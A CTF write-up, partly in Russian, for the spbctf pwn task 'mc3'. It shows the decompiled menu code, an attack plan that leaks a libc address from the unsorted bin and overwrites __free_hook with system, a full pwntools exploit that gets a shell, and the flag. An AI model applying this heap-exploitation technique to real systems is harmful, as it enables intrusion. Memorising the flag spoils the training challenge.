[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn9_mc3)
Hi! This one a bit more complex...
`nc 109.233.56.90 11802`
**[mc3.elf](https://pwn.spbctf.ru/files/bins/mc3/mc3.elf)**  
**[libc.so](https://pwn.spbctf.ru/files/bins/mc3/libc.so)**

``` C
unsigned __int64 logic()
{
  const char *v0; // rdi
  __int64 v1; // r12
  int v3; // [rsp+4h] [rbp-34h] BYREF
  _QWORD *v4; // [rsp+8h] [rbp-30h] BYREF
  __int64 v5; // [rsp+10h] [rbp-28h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  while ( 1 )
  {
    puts("Choose:\n\t1 - allocate mem print and free\n\t2 - print name\n\t3 - delete\n\t4 - write what where?");
    v3 = 3;
    alarm(0x78u);
    if ( (unsigned int)__isoc99_scanf("%d", &v3) != 1 )
      return __readfsqword(0x28u) ^ v6;
    getc(stdin);
    switch ( v3 )
    {
      case 1:
        allocate();
        break;
      case 2:
        puts("Index?");
        LODWORD(v5) = 800;
        __isoc99_scanf("%d", &v5);
        getc(stdin);
        if ( (unsigned int)v5 > 9 )
        {
LABEL_14:
          v0 = "...";
LABEL_11:
          puts(v0);
        }
        else
        {
          v0 = (const char *)array[(int)v5];
          if ( v0 )
            goto LABEL_11;
        }
        break;
      case 3:
        puts("Index?");
        LODWORD(v5) = 800;
        __isoc99_scanf("%d", &v5);
        getc(stdin);
        if ( (unsigned int)v5 > 9 )
          goto LABEL_14;
        v1 = (int)v5;
        free((void *)array[(int)v5]);
        array[v1] = 0;
        break;
      case 4:
        puts("enter address in hex:");
        __isoc99_scanf("%llx", &v4);
        getc(stdin);
        puts("enter value in hex:");
        __isoc99_scanf("%llx", &v5);
        getc(stdin);
        *v4 = v5;
        break;
      default:
        puts("What?");
        return __readfsqword(0x28u) ^ v6;
    }
  }
}
```

Решается также как и [leak and write](leak%20and%20write.md), но с занулением ссылки после удаления: `array[v1] = 0;`.

План атаки:
1. Аллоцировать два чанка размерами 2000 и 20;
2. Удалить первый чанк;
3. Аллоцировать первый чанк размера 0, чтобы он лёг поверх освобождённого чанка 2000;
4. Прочитать первый чанк, получив адрес внутри `libc` (`unsortedbin`);
5. Рассчитать оффсеты;
6. Воспользоваться WWW и переписать адрес `__free_hook` внутри `libc` на `system`;
7. Вызвать `free("/bin/sh")`, т.к. адреса подменены, то вызовется `system("/bin/sh")`

Эксплоит:
``` python
def send(io, data):
    io.recvuntil(b'4 - ')
    io.recvline()
    io.sendline(data)

main_arena_offset = 0x1ebb80
unsorted_bin_offset = 0x60
__free_hook_offset = 0x1eeb28
system_offset = 0x55410

io = start()

send(io, b'1 1050 qwe')
send(io, b'1 20 /bin/sh')

send(io, b'3 0') # delete first chunk

send(io, b'1 0')
send(io, b'2 0') # print first chunk

io.recvline()
libc_leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
libc_base = libc_leak - main_arena_offset - unsorted_bin_offset

__free_hook = libc_base + __free_hook_offset
system = libc_base + system_offset

send(io, (f'4 {hex(__free_hook)} {hex(system)}').encode())
send(io, b'3 1')

io.interactive()
```

Запуск:
![](../../../../z.%20Images/{8164B70C-7BD0-418B-AE82-76BC362A1C48}.png)

Ответ: `spbctf{mic_check_use_param_for_read}`